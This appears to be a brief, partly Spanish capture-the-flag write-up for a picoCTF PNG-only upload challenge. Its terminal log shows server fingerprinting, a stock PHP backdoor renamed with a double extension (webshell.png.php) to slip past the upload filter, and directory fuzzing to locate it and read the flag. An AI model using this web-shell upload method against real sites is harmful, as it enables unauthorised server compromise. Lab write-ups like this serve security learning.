## Objetivo

I found a web app that can help process images: PNG images only!

Additional details will be available after launching your challenge instance.

## Solución
```
┌──(kali㉿franco)-[~]
└─$ whatweb http://atlas.picoctf.net:61871/
http://atlas.picoctf.net:61871/ [200 OK] Apache[2.4.56], Country[UNITED STATES][US], HTML5, HTTPServer[Debian Linux][Apache/2.4.56 (Debian)], IP[18.217.83.136], PHP[8.0.30], Title[File Upload Page], X-Powered-By[PHP/8.0.30]


┌──(kali㉿franco)-[~]
└─$ mkdir picoCTF  
                                       
┌──(kali㉿franco)-[~]
└─$ cd picoCTF 
                                       
┌──(kali㉿franco)-[~/picoCTF]
└─$ cp /usr/share/webshells/php/simple-backdoor.php webshell.php

                                                                                 
┌──(kali㉿franco)-[~/picoCTF]
└─$ ls
webshell.php
                                                                                 
┌──(kali㉿franco)-[~/picoCTF]
└─$ nano webshell.php 
                                                                                 
┌──(kali㉿franco)-[~/picoCTF]
└─$ mv webshell.php webshell.png.php

──(kali㉿franco)-[~/picoCTF]
└─$ ffuf -u http://atlas.picoctf.net:61871/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -ic

                                
```

Despues nos movemos al directorio y ahi mismo le hacemos un cat, en donde nos da la bandera
## Notas adicionales

## Referencias